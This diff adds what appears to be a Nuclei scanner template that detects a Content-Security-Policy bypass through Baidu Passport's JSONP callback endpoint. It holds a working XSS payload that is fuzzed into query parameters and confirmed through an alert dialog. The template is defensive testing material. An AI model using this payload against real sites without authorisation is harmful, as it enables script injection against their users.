@@ -1,0 +1,55 @@
+id: baidu-passport-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Baidu Passport
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,baidu-passport,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "baidu.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: baidu_passport_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://passport.baidu.com/channel/unicast?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "baidu_passport_csp_xss == true"
+# digest: 4a0a0047304502210085fc7f128fd78d026379678ae3af3d448956a78b56603cdf207e49116e35c9fd0220100ad14abd1b65cbb7b049faef46906c010cb498416a7882f4f556ecb3ec333b:922c64590222798bb761d5b6d8e72950
